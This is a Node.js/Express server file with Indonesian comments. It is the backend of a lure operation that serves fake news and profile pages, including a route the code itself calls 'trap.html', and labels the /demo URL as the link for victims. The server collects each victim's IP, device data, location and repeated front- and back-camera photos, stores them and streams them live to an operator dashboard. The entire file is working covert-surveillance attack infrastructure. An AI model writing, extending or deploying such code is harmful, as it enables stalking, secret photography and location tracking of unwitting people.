// server.js - VERSI DIPERBAIKI UNTUK MULTIPLE CAMERA

const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const path = require("path");
const fs = require("fs");
const bodyParser = require("body-parser");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
  transports: ["websocket", "polling"], // Tambahkan transport fallback
});

// Middleware untuk CORS
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept, Authorization",
  );
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }
  next();
});

// Middleware untuk body parser dengan timeout
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// Buat folder captures jika belum ada
if (!fs.existsSync("captures")) {
  fs.mkdirSync("captures");
}

// Database sederhana
let victims = [];
let photos = {}; // Struktur: photos[victimId] = array of {image, cameraType, timestamp}

// ============= FUNGSI BANTUAN =============

// Fungsi untuk menyimpan log dengan format yang lebih baik
function saveToLog(data, type = "victim") {
  try {
    const logFile = type === "victim" ? "victims.log" : "photos.log";
    fs.appendFileSync(logFile, JSON.stringify(data) + "\n");
  } catch (error) {
    console.error("❌ Gagal menyimpan log:", error.message);
  }
}

// Fungsi untuk membersihkan foto lama (lebih dari 1 jam)
function cleanupOldPhotos() {
  try {
    const oneHourAgo = Date.now() - 60 * 60 * 1000;
    const files = fs.readdirSync("captures");
    let deletedCount = 0;

    for (const file of files) {
      const filePath = path.join("captures", file);
      const stats = fs.statSync(filePath);
      if (stats.mtimeMs < oneHourAgo) {
        fs.unlinkSync(filePath);
        deletedCount++;
      }
    }

    if (deletedCount > 0) {
      console.log(`🗑️ Cleaned up ${deletedCount} old photos`);
    }
  } catch (error) {
    console.error("❌ Gagal cleanup foto:", error.message);
  }
}

// Jalankan cleanup setiap 30 menit
setInterval(cleanupOldPhotos, 30 * 60 * 1000);

// ============= API ROUTES =============

// Endpoint untuk testing
app.get("/api/test", (req, res) => {
  res.json({
    status: "ok",
    message: "Server is running",
    timestamp: new Date().toISOString(),
    stats: {
      victims: victims.length,
      totalPhotos: Object.values(photos).reduce((sum, p) => sum + p.length, 0),
    },
  });
});

// API untuk mendapatkan statistik server
app.get("/api/stats", (req, res) => {
  const totalPhotos = Object.values(photos).reduce(
    (sum, p) => sum + p.length,
    0,
  );
  const frontPhotos = Object.values(photos).reduce(
    (sum, p) => sum + p.filter((photo) => photo.cameraType === "front").length,
    0,
  );
  const backPhotos = Object.values(photos).reduce(
    (sum, p) => sum + p.filter((photo) => photo.cameraType === "back").length,
    0,
  );

  res.json({
    victims: victims.length,
    totalPhotos,
    frontPhotos,
    backPhotos,
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    timestamp: new Date().toISOString(),
  });
});

// API untuk menerima data (device info, location, dll)
app.post("/api/capture", (req, res) => {
  console.log("📥 Data received:", req.body);

  try {
    const data = req.body;

    if (!data || !data.victimId) {
      return res.status(400).json({ error: "Invalid data" });
    }

    data.timestamp = new Date().toISOString();
    data.ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    const existingIndex = victims.findIndex(
      (v) => v.victimId === data.victimId,
    );

    if (existingIndex >= 0) {
      if (!victims[existingIndex].data) {
        victims[existingIndex].data = {};
      }

      if (data.type && data.data) {
        victims[existingIndex].data[data.type] = data.data;
      } else if (data.data) {
        victims[existingIndex].data = {
          ...victims[existingIndex].data,
          ...data.data,
        };
      }

      victims[existingIndex].timestamp = data.timestamp;
      victims[existingIndex].ip = data.ip;
    } else {
      const newVictim = {
        victimId: data.victimId,
        timestamp: data.timestamp,
        ip: data.ip,
        data: {},
      };

      if (data.type && data.data) {
        newVictim.data[data.type] = data.data;
      } else if (data.data) {
        newVictim.data = data.data;
      }

      victims.push(newVictim);
    }

    io.emit("new-victim", data);
    saveToLog(data, "victim");

    console.log(`✅ Data saved for victim: ${data.victimId}`);

    res.json({ status: "ok", message: "Data captured" });
  } catch (error) {
    console.error("❌ Error:", error);
    res.status(500).json({ error: error.message });
  }
});

// API untuk menerima gambar (DIPERBAIKI untuk multiple camera)
app.post("/api/capture-image", (req, res) => {
  console.log("📸 Received image upload request");

  try {
    const { image, victimId, cameraType, timestamp, isPeriodic } = req.body;

    if (!image || !victimId) {
      console.log("❌ Missing image or victimId");
      return res.status(400).json({ error: "Invalid data" });
    }

    // Log ukuran gambar dan info kamera
    const cameraTypeStr = cameraType || "unknown";
    console.log(
      `📸 Image from ${victimId}, camera: ${cameraTypeStr}, size: ${image.length} chars, periodic: ${isPeriodic || false}`,
    );

    // Hapus header base64
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");

    // Simpan ke file dengan nama yang lebih informatif
    const filename = `captures/${victimId}_${cameraTypeStr}_${Date.now()}.jpg`;
    fs.writeFileSync(filename, base64Data, "base64");
    console.log(`✅ Image saved to ${filename}`);

    // ========== PERBAIKAN: Simpan di memory dengan struktur array ==========
    if (!photos[victimId]) {
      photos[victimId] = [];
    }

    const photoData = {
      image: image,
      cameraType: cameraTypeStr,
      timestamp: timestamp || new Date().toISOString(),
      filename: filename,
      isPeriodic: isPeriodic || false,
    };

    photos[victimId].push(photoData);

    // Hanya simpan maksimal 30 foto terakhir per victim (ditingkatkan dari 20)
    if (photos[victimId].length > 30) {
      photos[victimId] = photos[victimId].slice(-30);
    }

    // Kirim ke dashboard
    io.emit("new-photo", {
      victimId,
      image: image,
      cameraType: cameraTypeStr,
      timestamp: photoData.timestamp,
      isPeriodic: photoData.isPeriodic,
    });

    // Simpan ke log foto
    saveToLog(
      { victimId, cameraType: cameraTypeStr, timestamp: photoData.timestamp },
      "photo",
    );

    console.log(
      `📤 Photo sent to dashboard for ${victimId} (${cameraTypeStr})`,
    );
    console.log(`📊 Total photos for ${victimId}: ${photos[victimId].length}`);

    res.json({ status: "ok", filename, cameraType: cameraTypeStr });
  } catch (error) {
    console.error("❌ Error saving image:", error);
    res.status(500).json({ error: error.message });
  }
});

// API untuk mendapatkan foto spesifik
app.get("/api/photos/:victimId", (req, res) => {
  const victimId = req.params.victimId;
  const limit = parseInt(req.query.limit) || 10;

  if (photos[victimId]) {
    const recentPhotos = photos[victimId].slice(-limit);
    res.json({
      victimId,
      photos: recentPhotos,
      count: photos[victimId].length,
      front: photos[victimId].filter((p) => p.cameraType === "front").length,
      back: photos[victimId].filter((p) => p.cameraType === "back").length,
      other: photos[victimId].filter(
        (p) => p.cameraType !== "front" && p.cameraType !== "back",
      ).length,
    });
  } else {
    res.json({ victimId, photos: [], count: 0, front: 0, back: 0, other: 0 });
  }
});

// API untuk mendapatkan semua victim
app.get("/api/victims", (req, res) => {
  const victimsWithStats = victims.map((v) => ({
    ...v,
    photoStats: photos[v.victimId]
      ? {
          total: photos[v.victimId].length,
          front: photos[v.victimId].filter((p) => p.cameraType === "front")
            .length,
          back: photos[v.victimId].filter((p) => p.cameraType === "back")
            .length,
        }
      : { total: 0, front: 0, back: 0 },
  }));

  res.json({
    victims: victimsWithStats,
    total: victims.length,
    timestamp: new Date().toISOString(),
  });
});

// API untuk membersihkan data
app.post("/api/clear-data", (req, res) => {
  try {
    victims = [];
    photos = {};

    // Kosongkan folder captures (opsional)
    const capturesDir = path.join(__dirname, "captures");
    if (fs.existsSync(capturesDir)) {
      const files = fs.readdirSync(capturesDir);
      for (const file of files) {
        fs.unlinkSync(path.join(capturesDir, file));
      }
    }

    // Kosongkan file log
    fs.writeFileSync("victims.log", "");
    if (fs.existsSync("photos.log")) {
      fs.writeFileSync("photos.log", "");
    }

    console.log("🗑️ All data cleared");
    io.emit("data-cleared");
    res.json({ status: "ok", message: "All data cleared" });
  } catch (error) {
    console.error("Error clearing data:", error);
    res.status(500).json({ error: error.message });
  }
});

// ============= STATIC FILES =============
app.use(
  express.static("public", {
    setHeaders: (res, path) => {
      if (path.endsWith(".html")) {
        res.setHeader("Cache-Control", "no-cache");
      }
      if (
        path.endsWith(".jpg") ||
        path.endsWith(".jpeg") ||
        path.endsWith(".png")
      ) {
        res.setHeader("Cache-Control", "public, max-age=86400");
      }
    },
  }),
);

// ============= PAGE ROUTES =============
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

app.get("/demo", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "trap.html"));
});

app.get("/berita", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/artikel", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/news", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/berita-terkini", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

// Route untuk halaman profil
app.get("/profil-zara", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "profil-zara.html"));
});

// ============= 404 HANDLER =============
app.use((req, res) => {
  if (req.path.startsWith("/api/")) {
    return res.status(404).json({ error: "API endpoint not found" });
  }
  if (req.path.includes(".")) {
    return res.status(404).send("File not found");
  }
  res.redirect("/berita");
});

// ============= SOCKET.IO =============
io.on("connection", (socket) => {
  const clientIp = socket.handshake.address;
  console.log(`📊 Dashboard terhubung dari ${clientIp}`);

  // Kirim statistik
  const totalVictims = victims.length;
  const cameraGranted = victims.filter(
    (v) => v.data?.camera_access?.status === "granted",
  ).length;
  const locationGranted = victims.filter(
    (v) => v.data?.location?.status === "granted",
  ).length;

  socket.emit("stats", {
    total: totalVictims,
    camera: cameraGranted,
    location: locationGranted,
  });

  // Kirim data victims yang sudah ada
  socket.emit("init-data", victims);

  // Kirim photos yang sudah ada (dengan struktur array)
  Object.keys(photos).forEach((victimId) => {
    // Kirim semua foto untuk victim ini
    photos[victimId].forEach((photo) => {
      socket.emit("new-photo", {
        victimId,
        image: photo.image,
        cameraType: photo.cameraType,
        timestamp: photo.timestamp,
      });
    });
  });

  console.log(
    `📊 Sent ${victims.length} victims and ${Object.keys(photos).length} photo records`,
  );

  // Handle ping untuk keep-alive
  socket.on("ping", () => {
    socket.emit("pong");
  });

  // Handle request refresh
  socket.on("request-refresh", () => {
    socket.emit("init-data", victims);
  });

  // Handle disconnect
  socket.on("disconnect", () => {
    console.log(`📊 Dashboard terputus dari ${clientIp}`);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, "0.0.0.0", () => {
  console.log("\n🚀 Demo server running di:");
  console.log(`   - Local: http://localhost:${PORT}`);
  console.log(`   - Network: http://${getLocalIP()}:${PORT}`);
  console.log(`📤 Link untuk korban: http://localhost:${PORT}/demo`);
  console.log(`📊 Link dashboard: http://localhost:${PORT}`);
  console.log(`📰 Link berita: http://localhost:${PORT}/berita`);
  console.log(`👤 Link profil: http://localhost:${PORT}/profil-zara`);
  console.log(`🖼️  Folder captures: ${path.join(__dirname, "captures")}`);
  console.log(`📁 Log file: victims.log`);
  console.log(`\n✨ Server siap menerima koneksi!\n`);
});

// Helper untuk mendapatkan IP lokal
function getLocalIP() {
  const { networkInterfaces } = require("os");
  const nets = networkInterfaces();

  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === "IPv4" && !net.internal) {
        return net.address;
      }
    }
  }
  return "127.0.0.1";
}

// Handle graceful shutdown
process.on("SIGINT", () => {
  console.log("\n🛑 Server dimatikan...");
  cleanupOldPhotos(); // Cleanup terakhir
  process.exit(0);
});

process.on("SIGTERM", () => {
  console.log("\n🛑 Server terminated...");
  cleanupOldPhotos();
  process.exit(0);
});
